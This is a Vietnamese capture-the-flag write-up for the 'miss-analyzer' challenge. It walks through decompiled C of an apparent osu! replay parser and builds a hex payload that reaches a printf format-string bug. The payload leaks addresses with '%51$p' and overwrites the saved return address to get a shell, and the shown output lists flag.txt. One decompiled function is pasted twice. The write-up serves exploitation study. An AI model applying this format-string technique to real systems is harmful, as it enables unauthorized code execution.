# write up miss-analyzer 

- ở bài này đầu tiên phải bắt đầu với hàm hexs2bin
```c
size = hexs2bin(v3, &pointerofbuff);
```
- hàm này có nhiệm vụ chuyển hết các kết quả mà chúng ta nhập vào thành dạng như này
- ví dụ aaaaaabbbbbbbcccccc thành  0xccccbbbbbbabaaaa hoặc  1234abcd6789 thành 0x8967cdab3412
- sau đó mang nó đem đi thực hiện các thao tác ở các hàm khác
- nhưng các ký tự chỉ được nhập trong vùng cho phép

```c
__int64 __fastcall hexchr2bin(char buff, _BYTE *container)
{
  if ( !container )
    return 0LL;
  if ( buff <= '/' || buff > '9' )
  {
    if ( buff <= '@' || buff > 'F' )
    {
      if ( buff <= '`' || buff > 'f' )
        return 0LL;
      *container = buff - 87;
    }
    else
    {
      *container = buff - 55;
    }
  }
  else
  {
    *container = buff - 48;
  }
  return 1LL;
}__int64 __fastcall hexchr2bin(char buff, _BYTE *container)
{
  if ( !container )
    return 0LL;
  if ( buff <= '/' || buff > '9' )
  {
    if ( buff <= '@' || buff > 'F' )
    {
      if ( buff <= '`' || buff > 'f' )
        return 0LL;
      *container = buff - 87;
    }
    else
    {
      *container = buff - 55;
    }
  }
  else
  {
    *container = buff - 48;
  }
  return 1LL;
}
```
- và số ký tự nhập vào phải là số chẵn nếu không chương trình sẽ dừng tại đây
```c
 if ( !size )
    {
      puts("Error: failed to decode hex");
      return 1;
    }
```
- nó thực hiện check qua cái này: 
```c
if ( (size & 1) != 0 )
    return 0LL;
```
- tiếp theo là hàm này

```c
__int64 __fastcall read_byte(_QWORD *pointerofbuff, _QWORD *size)
{
  unsigned __int8 incbuff; // [rsp+1Fh] [rbp-1h]

  if ( !*size )
  {
    puts("Error: failed to read replay");
    exit(1);
  }
  incbuff = *(_BYTE *)(*pointerofbuff)++;
  --*size;
  return incbuff;
}
```
- hàm này sẽ cộng địa chỉ được chứa trong pointerofbuff là buff lên 1 đơn vị và giảm size xuống 1 đơn vị
- vì vậy sau mỗi lần chạy nó sẽ giảm size xuống và số ký tự đc chứa trong địa chỉ ở trong pointerofbuff cũng giảm theo
```c
 consume_bytes(&pointerofbuff, &size, 4);
```
với hàm này cũng có cơ chế tương tự read_bytes nhưng mà ta có thể thay đổi số bytes, số bytes đó sẽ giảm size xuống và tăng giá trị của pointerofbuff theo số bytes đó 
- thông qua các cơ chế trên thì ta có thể nhập bytes cho phù hợp để vượt qua các hàm trên thông qua việc nhập ký tự là 8 bytes a đầu, chủ yếu là các hàm read_bytes và consume_bytes
```c
puts("Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):");
    buff = 0LL;
    n = 0LL;
    if ( getline(&buff, &n, stdin) <= 0 )
      break;
    buff[strcspn(buff, "\n")] = 0;
    if ( !*buff )
      break;
    size = hexs2bin(buff, &pointerofbuff);
    if ( !size )
    {
      puts("Error: failed to decode hex");
      return 1;
    }
    puts("\n=~= miss-analyzer =~=");
    choice = read_byte(&pointerofbuff, &size);
    if ( choice )
    {
      switch ( choice )
      {
        case 1:
          puts("Mode: osu!taiko");
          break;
        case 2:
          puts("Mode: osu!catch");
          break;
        case 3:
          puts("Mode: osu!mania");
          break;
      }
    }
    else
    {
      puts("Mode: osu!");
    }
    consume_bytes(&pointerofbuff, &size, 4);
```
- để có thể vượt qua hàm read_string thì ta phải nhập thêm 2 bytes a nữa cộng thêm bytes 0b
```c
 result = (_BYTE *)read_byte(buff, size);
  if ( (_BYTE)result )
  {
    if ( (_BYTE)result != 0xB )
    {
      puts("Error: failed to read string");
      exit(1);
    }
```
- để vượt các vòng lặp dưới nữa của hàm nàyvà có thể điều khiển số bytes nhập vào biến format ta có thể cộng thêm chuỗi nhập vào ban đầu là số nhưng phải bao gồm 2 chữ số
```c
   v10 = 0;
    for ( i = 0; ; i += 7 )
    {
      byte = read_byte(buff, size);
      v10 |= (byte & 127) << i;
      if ( byte >= 0 )
        break;
    }
    for ( j = 0; ; ++j )
    {
      v6 = a4;
      if ( a4 > v10 )
        v6 = v10;
      if ( v6 <= j )
        break;
      a3[j] = read_byte(buff, size);
    }
    while ( v10 > j )
```
- đây chính là nơi mà tạo ra size cho việc nhập format
```c
byte = read_byte(buff, size);
      v10 |= (byte & 127) << i;

```
```c
  read_string(&pointerofbuff, &size, format, '\xFF');
    printf("Hash: %s\n", format);
    read_string(&pointerofbuff, &size, format, 0xFFu);
    printf("Player name: ");
    printf(format);
```
- ở trong payload sẽ bao gồm việc vượt qua các hàm trên để đến được formatstring
```python
b'a'*10 +  b'0b' +b'08' + b'aabaaaaaabaaaaaa' + b'0b' + b'08' +  b'2535312470000000'
```
- format string sẽ được dịch lại tương tự như cách dịch của hàm hexs2bin: 2535312470000000
- sau khi nhập vào thì sẽ leak được địa chỉ và quay lại 1 vòng lặp mới
```assembly
  0x401928 <main+607>    mov    eax, 0
   0x40192d <main+612>    call   printf@plt                      <printf@plt>
 
   0x401932 <main+617>    lea    rax, [rbp - 0x120]
   0x401939 <main+624>    mov    rdi, rax
   0x40193c <main+627>    mov    eax, 0
 ► 0x401941 <main+632>    call   printf@plt                      <printf@plt>
        format: 0x7fffffffe4e0 ◂— 0x7024313525 /* '%51$p' */
        vararg: 0x7fffffffc380 ◂— 0x6e20726579616c50 ('Player n')
 
   0x401946 <main+637>    mov    edi, 0xa
   0x40194b <main+642>    call   putchar@plt                      <putchar@plt>
 
   0x401950 <main+647>    lea    rdx, [rbp - 0x120]
   0x401957 <main+654>    lea    rsi, [rbp - 0x130]
   0x40195e <main+661>    lea    rax, [rbp - 0x128]
```
- sau khi leak được địa chỉ thì đến bước ghi payload, em sẽ có 3 địa chỉ để ghi vào saved-rip, mỗi địa chỉ ghi 3 lần vì thế em cần viết hàm để ghi qua formatstring
- vì hàm main lặp lại nên có thể ghi nhiều lần tùy ý
- sau khi ghi xong và thoát khỏi vòng lặp thì em có thể chạy shell

[*] 0x2563343139383525
[*] 0x202020206e682436
[*] this is part 2 of addr 0x7fffffffe620: 0xf7c5
[*] this is package part 2: 0xe622
[*] Switching to interactive mode
```c
Error: failed to decode hex
$ ls
Dockerfile    analyzer_patched        analyzer_patched.id2  ld-2.35.so
analyzer      analyzer_patched.i64  analyzer_patched.nam  libc.so.6
analyzer.i64  analyzer_patched.id0  analyzer_patched.til  miss.md
analyzer.py   analyzer_patched.id1  flag.txt          start-docker.sh
```
